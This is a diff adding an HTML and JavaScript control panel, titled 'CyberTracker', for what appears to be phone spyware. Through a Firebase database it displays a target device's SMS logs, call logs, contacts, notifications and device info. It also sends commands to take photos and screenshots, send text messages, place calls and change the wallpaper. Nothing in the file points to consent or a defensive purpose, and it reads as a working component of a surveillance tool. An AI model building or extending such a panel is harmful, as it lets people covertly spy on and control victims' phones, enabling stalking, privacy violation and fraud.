@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberTracker Control Panel</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+</head>
+<body>
+    <h1>CyberTracker - Remote Control Panel</h1>
+
+    <div class="container">
+        <button onclick="fetchDeviceInfo()">📱 Fetch Device Info</button>
+        <button onclick="fetchSMS()">📩 View SMS Logs</button>
+        <button onclick="fetchCallLogs()">📞 View Call Logs</button>
+        <button onclick="fetchContacts()">📖 View Contacts</button>
+        <button onclick="fetchNotifications()">🔔 View Notifications</button>
+        <button onclick="capturePhoto()">📷 Capture Photo</button>
+        <button onclick="takeScreenshot()">🖥 Capture Screenshot</button>
+        <button onclick="sendSMS()">📤 Send SMS</button>
+        <button onclick="makeCall()">📲 Make Call</button>
+        <button onclick="changeWallpaper()">🖼 Change Wallpaper</button>
+    </div>
+
+    <div id="output"></div>
+
+    <script>
+        // Firebase Config (Replace with your Firebase Config)
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function fetchDeviceInfo() {
+            db.ref("Device_Info").once("value", snapshot => {
+                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+            });
+        }
+
+        function fetchSMS() {
+            db.ref("SMS_Logs").once("value", snapshot => {
+                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+            });
+        }
+
+        function fetchCallLogs() {
+            db.ref("Call_Logs").once("value", snapshot => {
+                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+            });
+        }
+
+        function fetchContacts() {
+            db.ref("Contacts").once("value", snapshot => {
+                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+            });
+        }
+
+        function fetchNotifications() {
+            db.ref("Notifications").once("value", snapshot => {
+                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+            });
+        }
+
+        function capturePhoto() {
+            db.ref("Commands").set({ action: "capture_photo" });
+        }
+
+        function takeScreenshot() {
+            db.ref("Commands").set({ action: "take_screenshot" });
+        }
+
+        function sendSMS() {
+            let number = prompt("Enter Phone Number:");
+            let message = prompt("Enter Message:");
+            db.ref("Commands").set({ action: "send_sms", number: number, message: message });
+        }
+
+        function makeCall() {
+            let number = prompt("Enter Phone Number:");
+            db.ref("Commands").set({ action: "make_call", number: number });
+        }
+
+        function changeWallpaper() {
+            let imageUrl = prompt("Enter Image URL:");
+            db.ref("Commands").set({ action: "change_wallpaper", url: imageUrl });
+        }
+    </script>
+</body>
+</html>
